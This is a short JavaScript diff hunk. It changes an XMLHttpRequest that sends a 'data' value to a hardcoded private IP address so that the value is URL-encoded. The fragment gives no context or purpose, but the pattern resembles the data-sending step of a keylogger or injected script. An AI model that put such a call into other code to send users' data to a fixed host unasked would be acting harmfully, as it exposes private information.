@@ -27,7 +27,7 @@
 					    if (this.readyState == 4 && this.status == 200) {
 					    }
 					};
-					xhttp.open("GET", "http://172.16.1.54/data=" + data, true);
+					xhttp.open("GET", "http://172.16.1.54/data=" + encodeURIComponent(data), true);
 					xhttp.send();
 			}
 
